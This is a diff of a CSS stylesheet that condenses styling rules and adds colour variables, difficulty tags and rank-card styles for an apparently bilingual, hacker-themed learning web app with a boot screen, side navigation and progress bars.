@@ -23,6 +23,8 @@
   --alert: #ff4d6a;
   --alert-soft: rgba(255,77,106,.12);
   --warn: #ffb020;
+  --warn-soft: rgba(255,176,32,.12);
+  --gold: #ffd166;
   --paper: #dbe8e2;
   --paper-dim: #7fa08f;
   --paper-faint: #4a6459;
@@ -35,17 +37,8 @@
   --ease: cubic-bezier(.16,.84,.44,1);
 }
 
-*,
-*::before,
-*::after {
-  box-sizing: border-box;
-  margin: 0;
-  padding: 0;
-}
-html {
-  -webkit-text-size-adjust: 100%;
-  font-size: 16px;
-}
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { -webkit-text-size-adjust: 100%; font-size: 16px; }
 body {
   min-height: 100vh;
   background: var(--void);
@@ -56,1208 +49,386 @@ body {
   position: relative;
   padding-bottom: env(safe-area-inset-bottom);
 }
-h1,h2,h3,h4 {
-  font-family: var(--font-ar);
-  font-weight: 800;
-  line-height: 1.3;
-}
-button,input,select,textarea {
-  font-family: inherit;
-  color: inherit;
-}
-button {
-  cursor: pointer;
-  background: none;
-  border: none;
-}
-a {
-  color: var(--cyan);
-}
-ul {
-  list-style: none;
-}
-img {
-  max-width: 100%;
-  display: block;
-}
+h1,h2,h3,h4 { font-family: var(--font-ar); font-weight: 800; line-height: 1.3; }
+button,input,select,textarea { font-family: inherit; color: inherit; }
+button { cursor: pointer; background: none; border: none; }
+a { color: var(--cyan); }
+ul { list-style: none; }
+img { max-width: 100%; display: block; }
 
-::-webkit-scrollbar {
-  width: 6px;
-  height: 6px;
-}
-::-webkit-scrollbar-track {
-  background: var(--void-2);
-}
-::-webkit-scrollbar-thumb {
-  background: var(--line-bright);
-  border-radius: 10px;
-}
-::-webkit-scrollbar-thumb:hover {
-  background: var(--signal-dim);
-}
-* {
-  scrollbar-color: var(--line-bright) var(--void-2);
-  scrollbar-width: thin;
-}
-
-:focus-visible {
-  outline: 2px solid var(--signal);
-  outline-offset: 2px;
-  border-radius: 2px;
-}
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: var(--void-2); }
+::-webkit-scrollbar-thumb { background: var(--line-bright); border-radius: 10px; }
+::-webkit-scrollbar-thumb:hover { background: var(--signal-dim); }
+* { scrollbar-color: var(--line-bright) var(--void-2); scrollbar-width: thin; }
+:focus-visible { outline: 2px solid var(--signal); outline-offset: 2px; border-radius: 2px; }
 
 /* Utilities */
-.hidden {
-  display: none !important;
-}
-.ltr {
-  direction: ltr;
-  text-align: left;
-}
-.rtl {
-  direction: rtl;
-  text-align: right;
-}
-.sr-only {
-  position: absolute;
-  width: 1px;
-  height: 1px;
-  overflow: hidden;
-  clip: rect(0,0,0,0);
-}
-.mono {
-  font-family: var(--font-mono);
-}
-.glow-green {
-  text-shadow: 0 0 8px rgba(57,255,136,.55), 0 0 22px rgba(57,255,136,.25);
-}
-.glow-cyan {
-  text-shadow: 0 0 8px rgba(47,224,224,.55), 0 0 22px rgba(47,224,224,.25);
-}
+.hidden { display: none !important; }
+.ltr { direction: ltr; text-align: left; }
+.rtl { direction: rtl; text-align: right; }
+.sr-only { position: absolute; width: 1px; height: 1px; overflow: hidden; clip: rect(0,0,0,0); }
+.mono { font-family: var(--font-mono); }
+.glow-green { text-shadow: 0 0 8px rgba(57,255,136,.55), 0 0 22px rgba(57,255,136,.25); }
+.glow-cyan { text-shadow: 0 0 8px rgba(47,224,224,.55), 0 0 22px rgba(47,224,224,.25); }
 
 /* Buttons */
 .btn {
-  display: inline-flex;
-  align-items: center;
-  justify-content: center;
-  gap: 8px;
-  font-family: var(--font-mono);
-  font-size: 14px;
-  letter-spacing: .02em;
-  padding: 12px 22px;
-  border-radius: var(--radius);
-  border: 1px solid var(--signal-dim);
-  background: var(--signal-soft);
-  color: var(--signal);
-  transition: all .18s var(--ease);
-  cursor: pointer;
+  display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+  font-family: var(--font-mono); font-size: 14px; letter-spacing: .02em;
+  padding: 12px 22px; border-radius: var(--radius); border: 1px solid var(--signal-dim);
+  background: var(--signal-soft); color: var(--signal); transition: all .18s var(--ease); cursor: pointer;
 }
-.btn:hover {
-  background: rgba(57,255,136,.2);
-  box-shadow: 0 0 18px rgba(57,255,136,.3);
-  transform: translateY(-1px);
-}
-.btn:active {
-  transform: translateY(0);
-}
-.btn:disabled {
-  opacity: .35;
-  cursor: not-allowed;
-  box-shadow: none;
-  transform: none;
-}
-.btn-solid {
-  background: var(--signal);
-  color: #04140a;
-  border-color: var(--signal);
-  font-weight: 700;
-}
-.btn-solid:hover {
-  background: #5affa0;
-  box-shadow: 0 0 24px rgba(57,255,136,.5);
-}
-.btn-ghost {
-  background: transparent;
-  border-color: var(--line-bright);
-  color: var(--paper-dim);
-}
-.btn-ghost:hover {
-  border-color: var(--signal-dim);
-  color: var(--signal);
-  background: var(--signal-soft);
-}
-.btn-cyan {
-  border-color: var(--cyan);
-  color: var(--cyan);
-  background: var(--cyan-soft);
-}
-.btn-cyan:hover {
-  background: rgba(47,224,224,.2);
-  box-shadow: 0 0 18px rgba(47,224,224,.3);
-}
-.btn-danger {
-  border-color: var(--alert);
-  color: var(--alert);
-  background: var(--alert-soft);
-}
-.btn-danger:hover {
-  background: rgba(255,77,106,.2);
-}
-.btn-block {
-  width: 100%;
-}
-.btn-sm {
-  padding: 8px 14px;
-  font-size: 12.5px;
-}
+.btn:hover { background: rgba(57,255,136,.2); box-shadow: 0 0 18px rgba(57,255,136,.3); transform: translateY(-1px); }
+.btn:active { transform: translateY(0); }
+.btn:disabled { opacity: .35; cursor: not-allowed; box-shadow: none; transform: none; }
+.btn-solid { background: var(--signal); color: #04140a; border-color: var(--signal); font-weight: 700; }
+.btn-solid:hover { background: #5affa0; box-shadow: 0 0 24px rgba(57,255,136,.5); }
+.btn-ghost { background: transparent; border-color: var(--line-bright); color: var(--paper-dim); }
+.btn-ghost:hover { border-color: var(--signal-dim); color: var(--signal); background: var(--signal-soft); }
+.btn-cyan { border-color: var(--cyan); color: var(--cyan); background: var(--cyan-soft); }
+.btn-cyan:hover { background: rgba(47,224,224,.2); box-shadow: 0 0 18px rgba(47,224,224,.3); }
+.btn-danger { border-color: var(--alert); color: var(--alert); background: var(--alert-soft); }
+.btn-danger:hover { background: rgba(255,77,106,.2); }
+.btn-block { width: 100%; }
+.btn-sm { padding: 8px 14px; font-size: 12.5px; }
 
 /* Cards & Panels */
-.panel {
-  background: var(--panel);
-  border: 1px solid var(--line);
-  border-radius: var(--radius-lg);
-}
+.panel { background: var(--panel); border: 1px solid var(--line); border-radius: var(--radius-lg); }
 .tag {
-  display: inline-flex;
-  align-items: center;
-  gap: 6px;
-  font-family: var(--font-mono);
-  font-size: 11px;
-  padding: 3px 9px;
-  border-radius: 20px;
-  border: 1px solid var(--line-bright);
-  color: var(--paper-dim);
-  letter-spacing: .03em;
+  display: inline-flex; align-items: center; gap: 6px; font-family: var(--font-mono); font-size: 11px;
+  padding: 3px 9px; border-radius: 20px; border: 1px solid var(--line-bright); color: var(--paper-dim); letter-spacing: .03em;
 }
-.tag.ok {
-  color: var(--signal);
-  border-color: var(--signal-dim);
-  background: var(--signal-soft);
-}
-.tag.locked {
-  color: var(--paper-faint);
-}
-.tag.danger {
-  color: var(--alert);
-  border-color: rgba(255,77,106,.4);
-  background: var(--alert-soft);
-}
+.tag.ok { color: var(--signal); border-color: var(--signal-dim); background: var(--signal-soft); }
+.tag.locked { color: var(--paper-faint); }
+.tag.danger { color: var(--alert); border-color: rgba(255,77,106,.4); background: var(--alert-soft); }
+.tag.gold { color: var(--gold); border-color: rgba(255,209,102,.4); background: rgba(255,209,102,.1); }
+
+.diff-tag { font-family: var(--font-mono); font-size: 10px; padding: 2px 8px; border-radius: 20px; border: 1px solid; }
+.diff-easy { color: var(--signal); border-color: var(--signal-dim); background: var(--signal-soft); }
+.diff-medium { color: var(--warn); border-color: rgba(255,176,32,.4); background: var(--warn-soft); }
+.diff-hard { color: var(--alert); border-color: rgba(255,77,106,.4); background: var(--alert-soft); }
 
 /* Auth Screen */
 #authScreen {
-  position: fixed;
-  inset: 0;
-  z-index: 100;
-  background: var(--void);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  padding: 20px;
+  position: fixed; inset: 0; z-index: 100; background: var(--void);
+  display: flex; align-items: center; justify-content: center; padding: 20px;
   transition: opacity .5s, visibility .5s;
 }
-#authScreen.hidden {
-  opacity: 0;
-  visibility: hidden;
-  pointer-events: none;
+#authScreen.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
+.auth-box { width: 100%; max-width: 400px; background: var(--panel); border: 1px solid var(--line); border-radius: var(--radius-lg); padding: 32px 24px; text-align: center; }
+.auth-box .logo { font-family: var(--font-mono); direction: ltr; font-size: 20px; margin-bottom: 6px; }
+.auth-box .logo .idx { color: var(--paper-faint); font-size: 12px; }
+.auth-box .logo .accent { color: var(--signal); }
+.auth-box .subtitle { color: var(--paper-dim); font-size: 13px; margin-bottom: 20px; }
+.auth-tabs { display: flex; margin-bottom: 20px; border: 1px solid var(--line); border-radius: 20px; overflow: hidden; }
+.auth-tab { flex: 1; padding: 8px; font-size: 13px; background: transparent; color: var(--paper-dim); transition: 0.2s; }
+.auth-tab.active { background: var(--signal-soft); color: var(--signal); }
+.field { margin-bottom: 14px; text-align: right; }
+[dir="ltr"] .field { text-align: left; }
+.field label { display: block; font-size: 12px; color: var(--paper-dim); margin-bottom: 6px; }
+.field input, .field select {
+  width: 100%; padding: 12px; background: var(--void-2); border: 1px solid var(--line-bright);
+  border-radius: var(--radius); color: var(--paper); font-family: var(--font-mono); font-size: 14px;
+  direction: ltr; text-align: left;
 }
-.auth-box {
-  width: 100%;
-  max-width: 400px;
-  background: var(--panel);
-  border: 1px solid var(--line);
-  border-radius: var(--radius-lg);
-  padding: 32px 24px;
-  text-align: center;
-}
-.auth-box .logo {
-  font-family: var(--font-mono);
-  direction: ltr;
-  font-size: 20px;
-  margin-bottom: 6px;
-}
-.auth-box .logo .idx {
-  color: var(--paper-faint);
-  font-size: 12px;
-}
-.auth-box .logo .accent {
-  color: var(--signal);
-}
-.auth-box .subtitle {
-  color: var(--paper-dim);
-  font-size: 13px;
-  margin-bottom: 20px;
-}
-.auth-tabs {
-  display: flex;
-  margin-bottom: 20px;
-  border: 1px solid var(--line);
-  border-radius: 20px;
-  overflow: hidden;
-}
-.auth-tab {
-  flex: 1;
-  padding: 8px;
-  font-size: 13px;
-  background: transparent;
-  color: var(--paper-dim);
-  transition: 0.2s;
-}
-.auth-tab.active {
-  background: var(--signal-soft);
-  color: var(--signal);
-}
-.field {
-  margin-bottom: 14px;
-  text-align: right;
-}
-[dir="ltr"] .field {
-  text-align: left;
-}
-.field label {
-  display: block;
-  font-size: 12px;
-  color: var(--paper-dim);
-  margin-bottom: 6px;
-}
-.field input {
-  width: 100%;
-  padding: 12px;
-  background: var(--void-2);
-  border: 1px solid var(--line-bright);
-  border-radius: var(--radius);
-  color: var(--paper);
-  font-family: var(--font-mono);
-  font-size: 14px;
-  direction: ltr;
-  text-align: left;
-}
-.auth-error {
-  color: var(--alert);
-  font-size: 12px;
-  margin-top: 8px;
-  min-height: 18px;
-}
+.auth-error { color: var(--alert); font-size: 12px; margin-top: 8px; min-height: 18px; }
 
 /* Background Effects */
-#matrixCanvas {
-  position: fixed;
-  inset: 0;
-  z-index: 0;
-  opacity: .4;
-  pointer-events: none;
-}
+#matrixCanvas { position: fixed; inset: 0; z-index: 0; opacity: .4; pointer-events: none; }
 #scanlines {
-  position: fixed;
-  inset: 0;
-  z-index: 1;
-  pointer-events: none;
+  position: fixed; inset: 0; z-index: 1; pointer-events: none;
   background: repeating-linear-gradient(180deg, rgba(0,0,0,0) 0, rgba(0,0,0,0) 2px, rgba(0,0,0,.08) 3px);
-  mix-blend-mode: multiply;
-  opacity: .3;
+  mix-blend-mode: multiply; opacity: .3;
 }
 #vignette {
-  position: fixed;
-  inset: 0;
-  z-index: 1;
-  pointer-events: none;
+  position: fixed; inset: 0; z-index: 1; pointer-events: none;
   background: radial-gradient(ellipse at 50% 40%, transparent 40%, rgba(0,0,0,.55) 100%);
 }
 
 /* Boot Screen */
 #bootScreen {
-  position: fixed;
-  inset: 0;
-  z-index: 50;
-  background: var(--void);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  padding: 24px;
+  position: fixed; inset: 0; z-index: 50; background: var(--void);
+  display: flex; align-items: center; justify-content: center; padding: 24px;
   transition: opacity .6s var(--ease), visibility .6s;
 }
-#bootScreen.fade-out {
-  opacity: 0;
-  visibility: hidden;
-  pointer-events: none;
-}
-.boot-box {
-  width: 100%;
-  max-width: 640px;
-  font-family: var(--font-mono);
-  direction: ltr;
-  text-align: left;
-}
-.boot-lines {
-  min-height: 200px;
-  font-size: 13px;
-  line-height: 1.9;
-  color: var(--signal);
-  white-space: pre-wrap;
-  word-break: break-word;
-}
-.boot-lines .dim {
-  color: var(--paper-dim);
-}
-.boot-lines .cyan-line {
-  color: var(--cyan);
-}
-.boot-cta {
-  margin-top: 28px;
-  direction: rtl;
-  text-align: center;
-  opacity: 0;
-  transform: translateY(10px);
-  transition: all .5s var(--ease);
-}
-.boot-cta.show {
-  opacity: 1;
-  transform: translateY(0);
-}
-.boot-title {
-  font-family: var(--font-ar);
-  direction: rtl;
-  font-size: 14px;
-  color: var(--paper-dim);
-  margin-bottom: 14px;
-}
+#bootScreen.fade-out { opacity: 0; visibility: hidden; pointer-events: none; }
+.boot-box { width: 100%; max-width: 640px; font-family: var(--font-mono); direction: ltr; text-align: left; }
+.boot-lines { min-height: 200px; font-size: 13px; line-height: 1.9; color: var(--signal); white-space: pre-wrap; word-break: break-word; }
+.boot-lines .dim { color: var(--paper-dim); }
+.boot-lines .cyan-line { color: var(--cyan); }
+.boot-cta { margin-top: 28px; direction: rtl; text-align: center; opacity: 0; transform: translateY(10px); transition: all .5s var(--ease); }
+.boot-cta.show { opacity: 1; transform: translateY(0); }
+.boot-title { font-family: var(--font-ar); direction: rtl; font-size: 14px; color: var(--paper-dim); margin-bottom: 14px; }
 
 /* Topbar */
 .topbar {
-  position: fixed;
-  top: 0;
-  left: 0;
-  right: 0;
-  height: var(--topbar-h);
-  z-index: 30;
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  padding: 0 12px;
-  background: rgba(7,10,9,.86);
-  backdrop-filter: blur(10px);
-  border-bottom: 1px solid var(--line);
+  position: fixed; top: 0; left: 0; right: 0; height: var(--topbar-h); z-index: 30;
+  display: flex; align-items: center; justify-content: space-between; padding: 0 12px;
+  background: rgba(7,10,9,.86); backdrop-filter: blur(10px); border-bottom: 1px solid var(--line);
 }
-.topbar-start {
-  display: flex;
-  align-items: center;
-  gap: 8px;
-}
+.topbar-start { display: flex; align-items: center; gap: 8px; }
 .icon-btn {
-  width: 38px;
-  height: 38px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  border: 1px solid var(--line-bright);
-  border-radius: var(--radius);
-  color: var(--paper-dim);
-  font-size: 16px;
-  transition: all .15s var(--ease);
+  width: 38px; height: 38px; display: flex; align-items: center; justify-content: center;
+  border: 1px solid var(--line-bright); border-radius: var(--radius); color: var(--paper-dim);
+  font-size: 16px; transition: all .15s var(--ease);
 }
-.icon-btn:hover {
-  color: var(--signal);
-  border-color: var(--signal-dim);
-  background: var(--signal-soft);
-}
-.brand {
-  font-family: var(--font-mono);
-  font-weight: 700;
-  font-size: 14px;
-  letter-spacing: .02em;
-  direction: ltr;
-  color: var(--paper);
-  white-space: nowrap;
-}
-.brand .accent {
-  color: var(--signal);
-}
-.brand .idx {
-  color: var(--paper-faint);
-  font-size: 10px;
-}
-.topbar-end {
-  display: flex;
-  align-items: center;
-  gap: 6px;
-}
+.icon-btn:hover { color: var(--signal); border-color: var(--signal-dim); background: var(--signal-soft); }
+.brand { font-family: var(--font-mono); font-weight: 700; font-size: 14px; letter-spacing: .02em; direction: ltr; color: var(--paper); white-space: nowrap; }
+.brand .accent { color: var(--signal); }
+.brand .idx { color: var(--paper-faint); font-size: 10px; }
+.topbar-end { display: flex; align-items: center; gap: 6px; }
 .stat-chip {
-  font-family: var(--font-mono);
-  font-size: 10.5px;
-  color: var(--paper-dim);
-  border: 1px solid var(--line-bright);
-  border-radius: 20px;
-  padding: 4px 10px;
-  display: flex;
-  align-items: center;
-  gap: 6px;
-  white-space: nowrap;
+  font-family: var(--font-mono); font-size: 10.5px; color: var(--paper-dim); border: 1px solid var(--line-bright);
+  border-radius: 20px; padding: 4px 10px; display: flex; align-items: center; gap: 6px; white-space: nowrap;
 }
-.stat-chip b {
-  color: var(--signal);
-  font-weight: 700;
-}
-.stat-chip.cyan b {
-  color: var(--cyan);
-}
-.lang-switch {
-  display: flex;
-  gap: 2px;
-  margin-inline-end: 4px;
-}
-.lang-btn {
-  width: 30px;
-  height: 30px;
-  border-radius: 50%;
-  font-size: 11px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  color: var(--paper-dim);
-  transition: all .15s;
-}
-.lang-btn.active {
-  background: var(--signal-soft);
-  color: var(--signal);
-}
+.stat-chip b { color: var(--signal); font-weight: 700; }
+.stat-chip.cyan b { color: var(--cyan); }
+.stat-chip.streak b { color: var(--warn); }
+.lang-switch { display: flex; gap: 2px; margin-inline-end: 4px; }
+.lang-btn { width: 30px; height: 30px; border-radius: 50%; font-size: 11px; display: flex; align-items: center; justify-content: center; color: var(--paper-dim); transition: all .15s; }
+.lang-btn.active { background: var(--signal-soft); color: var(--signal); }
 .user-pill {
-  display: flex;
-  align-items: center;
-  gap: 6px;
-  padding: 4px 10px;
-  border-radius: 20px;
-  font-size: 11px;
-  background: var(--panel);
-  border: 1px solid var(--line-bright);
-  cursor: pointer;
-  white-space: nowrap;
+  display: flex; align-items: center; gap: 6px; padding: 4px 10px; border-radius: 20px; font-size: 11px;
+  background: var(--panel); border: 1px solid var(--line-bright); cursor: pointer; white-space: nowrap;
 }
 .user-pill .avatar {
-  width: 20px;
-  height: 20px;
-  border-radius: 50%;
-  background: var(--signal);
-  color: #04140a;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 10px;
-  font-weight: 700;
-  font-family: var(--font-mono);
+  width: 20px; height: 20px; border-radius: 50%; background: var(--signal); color: #04140a;
+  display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: 700; font-family: var(--font-mono);
 }
 
 /* Side Nav */
 .nav-overlay {
-  position: fixed;
-  inset: 0;
-  background: rgba(0,0,0,.6);
-  z-index: 34;
-  opacity: 0;
-  visibility: hidden;
+  position: fixed; inset: 0; background: rgba(0,0,0,.6); z-index: 34; opacity: 0; visibility: hidden;
   transition: opacity .25s var(--ease), visibility .25s;
 }
-.nav-overlay.open {
-  opacity: 1;
-  visibility: visible;
-}
+.nav-overlay.open { opacity: 1; visibility: visible; }
 .side-nav {
-  position: fixed;
-  top: var(--topbar-h);
-  right: 0;
-  width: min(85vw, var(--nav-w));
-  height: calc(100vh - var(--topbar-h));
-  z-index: 35;
-  background: var(--void-2);
-  border-left: 1px solid var(--line);
-  transform: translateX(100%);
-  transition: transform .3s var(--ease);
-  overflow-y: auto;
-  padding: 18px 16px 100px;
+  position: fixed; top: var(--topbar-h); right: 0; width: min(85vw, var(--nav-w)); height: calc(100vh - var(--topbar-h));
+  z-index: 35; background: var(--void-2); border-left: 1px solid var(--line); transform: translateX(100%);
+  transition: transform .3s var(--ease); overflow-y: auto; padding: 18px 16px 100px;
 }
-[dir="ltr"] .side-nav {
-  right: auto;
-  left: 0;
-  transform: translateX(-100%);
-  border-left: none;
-  border-right: 1px solid var(--line);
-}
-.side-nav.open {
-  transform: translateX(0);
-}
-.nav-block-title {
-  font-family: var(--font-mono);
-  font-size: 10.5px;
-  letter-spacing: .12em;
-  color: var(--paper-faint);
-  text-transform: uppercase;
-  margin: 20px 0 10px;
-  padding-inline-start: 4px;
-}
-.overall-progress-wrap {
-  padding: 14px;
-  border: 1px solid var(--line);
-  border-radius: var(--radius-lg);
-  background: var(--panel);
-}
-.overall-progress-label {
-  display: flex;
-  justify-content: space-between;
-  font-size: 12.5px;
-  color: var(--paper-dim);
-  margin-bottom: 8px;
-}
-.progress-bar {
-  height: 8px;
-  border-radius: 20px;
-  background: var(--void-2);
-  border: 1px solid var(--line);
-  overflow: hidden;
-}
-.progress-fill {
-  height: 100%;
-  border-radius: 20px;
-  background: linear-gradient(90deg, var(--signal-dim), var(--signal));
-  width: 0%;
-  transition: width .5s var(--ease);
-  box-shadow: 0 0 10px rgba(57,255,136,.5);
-}
-.level-line {
-  margin-top: 10px;
-  font-family: var(--font-mono);
-  font-size: 11.5px;
-  color: var(--cyan);
-}
+[dir="ltr"] .side-nav { right: auto; left: 0; transform: translateX(-100%); border-left: none; border-right: 1px solid var(--line); }
+.side-nav.open { transform: translateX(0); }
+.nav-block-title { font-family: var(--font-mono); font-size: 10.5px; letter-spacing: .12em; color: var(--paper-faint); text-transform: uppercase; margin: 20px 0 10px; padding-inline-start: 4px; }
 
-.module-nav-list {
-  display: flex;
-  flex-direction: column;
-  gap: 6px;
-}
-.module-nav-item {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-  padding: 10px;
-  border-radius: var(--radius);
-  border: 1px solid transparent;
-  transition: all .15s var(--ease);
-}
-.module-nav-item.clickable {
-  cursor: pointer;
-}
-.module-nav-item.clickable:hover {
-  background: var(--panel);
-  border-color: var(--line-bright);
-}
-.module-nav-item.active {
-  background: var(--signal-soft);
-  border-color: var(--signal-dim);
-}
-.module-nav-item.done .module-nav-idx {
-  background: var(--signal);
-  border-color: var(--signal);
-  color: #04140a;
-}
-.module-nav-item.locked {
-  opacity: .5;
-  pointer-events: none;
-}
+.rank-card { padding: 14px; border: 1px solid var(--line); border-radius: var(--radius-lg); background: linear-gradient(145deg, var(--panel), var(--panel-2)); margin-bottom: 4px; }
+.rank-card .rank-name { font-size: 15px; font-weight: 800; color: var(--signal); }
+.rank-card .rank-next { font-family: var(--font-mono); font-size: 10.5px; color: var(--paper-faint); margin-top: 2px; }
+
+.overall-progress-wrap { padding: 14px; border: 1px solid var(--line); border-radius: var(--radius-lg); background: var(--panel); margin-top: 10px; }
+.overall-progress-label { display: flex; justify-content: space-between; font-size: 12.5px; color: var(--paper-dim); margin-bottom: 8px; }
+.progress-bar { height: 8px; border-radius: 20px; background: var(--void-2); border: 1px solid var(--line); overflow: hidden; }
+.progress-fill { height: 100%; border-radius: 20px; background: linear-gradient(90deg, var(--signal-dim), var(--signal)); width: 0%; transition: width .5s var(--ease); box-shadow: 0 0 10px rgba(57,255,136,.5); }
+.level-line { margin-top: 10px; font-family: var(--font-mono); font-size: 11.5px; color: var(--cyan); }
+
+.module-nav-list { display: flex; flex-direction: column; gap: 6px; }
+.module-nav-item { display: flex; align-items: center; gap: 10px; padding: 10px; border-radius: var(--radius); border: 1px solid transparent; transition: all .15s var(--ease); }
+.module-nav-item.clickable { cursor: pointer; }
+.module-nav-item.clickable:hover { background: var(--panel); border-color: var(--line-bright); }
+.module-nav-item.active { background: var(--signal-soft); border-color: var(--signal-dim); }
+.module-nav-item.done .module-nav-idx { background: var(--signal); border-color: var(--signal); color: #04140a; }
+.module-nav-item.locked { opacity: .5; pointer-events: none; }
 .module-nav-idx {
-  font-family: var(--font-mono);
-  font-size: 11px;
-  width: 26px;
-  height: 26px;
-  border-radius: 50%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  flex-shrink: 0;
-  border: 1px solid var(--line-bright);
-  color: var(--paper-dim);
+  font-family: var(--font-mono); font-size: 11px; width: 26px; height: 26px; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center; flex-shrink: 0; border: 1px solid var(--line-bright); color: var(--paper-dim);
 }
-.module-nav-text {
-  flex: 1;
-  min-width: 0;
-}
-.module-nav-title {
-  font-size: 13.5px;
-  color: var(--paper);
-  white-space: nowrap;
-  overflow: hidden;
-  text-overflow: ellipsis;
-}
-.module-nav-sub {
-  font-family: var(--font-mono);
-  font-size: 10px;
-  color: var(--paper-faint);
-  direction: ltr;
-  text-align: right;
-}
-.nav-cta-list {
-  display: flex;
-  flex-direction: column;
-  gap: 8px;
-  margin-top: 22px;
-}
+.module-nav-text { flex: 1; min-width: 0; }
+.module-nav-title { font-size: 13.5px; color: var(--paper); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.module-nav-sub { font-family: var(--font-mono); font-size: 10px; color: var(--paper-faint); direction: ltr; text-align: right; }
+.nav-cta-list { display: flex; flex-direction: column; gap: 8px; margin-top: 22px; }
 .nav-cta {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-  padding: 12px;
-  border-radius: var(--radius);
-  border: 1px solid var(--line-bright);
-  color: var(--paper);
-  font-size: 13.5px;
-  transition: all .15s var(--ease);
+  display: flex; align-items: center; gap: 10px; padding: 12px; border-radius: var(--radius);
+  border: 1px solid var(--line-bright); color: var(--paper); font-size: 13.5px; transition: all .15s var(--ease);
 }
-.nav-cta:hover {
-  border-color: var(--cyan);
-  color: var(--cyan);
-  background: var(--cyan-soft);
-}
-.nav-cta.logout-cta {
-  color: var(--alert);
-  border-color: rgba(255,77,106,.4);
-}
-.nav-cta.logout-cta:hover {
-  background: var(--alert-soft);
-  border-color: var(--alert);
-}
-.nav-cta .n {
-  margin-inline-start: auto;
-  font-family: var(--font-mono);
-  font-size: 11px;
-  color: var(--paper-faint);
-}
+.nav-cta:hover { border-color: var(--cyan); color: var(--cyan); background: var(--cyan-soft); }
+.nav-cta.logout-cta { color: var(--alert); border-color: rgba(255,77,106,.4); }
+.nav-cta.logout-cta:hover { background: var(--alert-soft); border-color: var(--alert); }
+.nav-cta .n { margin-inline-start: auto; font-family: var(--font-mono); font-size: 11px; color: var(--paper-faint); }
 
-/* Desktop: side nav always visible */
 @media(min-width: 1080px) {
-  .side-nav {
-    position: fixed;
-    transform: none;
-    border-left: 1px solid var(--line);
-  }
-  [dir="ltr"] .side-nav {
-    transform: none;
-    border-right: 1px solid var(--line);
-  }
-  .nav-overlay {
-    display: none;
-  }
-  #menuToggle {
-    display: none;
-  }
-  .main-content {
-    padding-inline-end: var(--nav-w);
-  }
-  [dir="ltr"] .main-content {
-    padding-inline-end: 0;
-    padding-inline-start: var(--nav-w);
-  }
+  .side-nav { position: fixed; transform: none; border-left: 1px solid var(--line); }
+  [dir="ltr"] .side-nav { transform: none; border-right: 1px solid var(--line); }
+  .nav-overlay { display: none; }
+  #menuToggle { display: none; }
+  .main-content { padding-inline-end: var(--nav-w); }
+  [dir="ltr"] .main-content { padding-inline-end: 0; padding-inline-start: var(--nav-w); }
 }
 
-/* Main Content */
-.main-content {
-  padding-top: var(--topbar-h);
-  position: relative;
-  z-index: 5;
-  min-height: 100vh;
-}
-.view {
-  max-width: 920px;
-  margin: 0 auto;
-  padding: 28px 16px 100px;
-  animation: viewIn .35s var(--ease);
-}
-@keyframes viewIn {
-  from { opacity: 0; transform: translateY(8px); }
-  to { opacity: 1; transform: translateY(0); }
-}
+.main-content { padding-top: var(--topbar-h); position: relative; z-index: 5; min-height: 100vh; }
+.view { max-width: 960px; margin: 0 auto; padding: 28px 16px 100px; animation: viewIn .35s var(--ease); }
+@keyframes viewIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
 
-/* Bottom Nav (Mobile) */
 .bottom-nav {
-  display: flex;
-  position: fixed;
-  bottom: 0;
-  left: 0;
-  right: 0;
-  z-index: 30;
-  height: 60px;
-  background: rgba(7,10,9,.92);
-  backdrop-filter: blur(10px);
-  border-top: 1px solid var(--line);
-  justify-content: space-around;
-  align-items: center;
-  padding-bottom: env(safe-area-inset-bottom);
+  display: flex; position: fixed; bottom: 0; left: 0; right: 0; z-index: 30; height: 60px;
+  background: rgba(7,10,9,.92); backdrop-filter: blur(10px); border-top: 1px solid var(--line);
+  justify-content: space-around; align-items: center; padding-bottom: env(safe-area-inset-bottom);
 }
-@media(min-width: 1080px) {
-  .bottom-nav {
-    display: none;
-  }
-}
-.bottom-nav-item {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  gap: 2px;
-  padding: 6px 10px;
-  font-size: 10px;
-  color: var(--paper-faint);
-  transition: all .15s;
-  border-radius: var(--radius);
-}
-.bottom-nav-item.active {
-  color: var(--signal);
-}
-.bottom-nav-item .ico {
-  font-size: 18px;
-}
+@media(min-width: 1080px) { .bottom-nav { display: none; } }
+.bottom-nav-item { display: flex; flex-direction: column; align-items: center; gap: 2px; padding: 6px 10px; font-size: 10px; color: var(--paper-faint); transition: all .15s; border-radius: var(--radius); }
+.bottom-nav-item.active { color: var(--signal); }
+.bottom-nav-item .ico { font-size: 18px; }
 
 /* Hero & Cards */
 .hero-panel {
-  padding: 24px 20px;
-  border-radius: var(--radius-lg);
-  border: 1px solid var(--line);
-  background: linear-gradient(145deg, var(--panel), var(--panel-2));
-  position: relative;
-  overflow: hidden;
-  margin-bottom: 24px;
+  padding: 24px 20px; border-radius: var(--radius-lg); border: 1px solid var(--line);
+  background: linear-gradient(145deg, var(--panel), var(--panel-2)); position: relative; overflow: hidden; margin-bottom: 24px;
 }
 .hero-panel::after {
-  content: "";
-  position: absolute;
-  right: -40px;
-  top: -40px;
-  width: 160px;
-  height: 160px;
-  background: radial-gradient(circle, rgba(57,255,136,.18), transparent 70%);
-  pointer-events: none;
+  content: ""; position: absolute; right: -40px; top: -40px; width: 160px; height: 160px;
+  background: radial-gradient(circle, rgba(57,255,136,.18), transparent 70%); pointer-events: none;
 }
-.hero-h1 {
-  font-size: clamp(22px, 5vw, 30px);
-  margin-bottom: 10px;
-}
-.hero-h1 .zero {
-  color: var(--signal);
-}
-.hero-desc {
-  color: var(--paper-dim);
-  font-size: 14.5px;
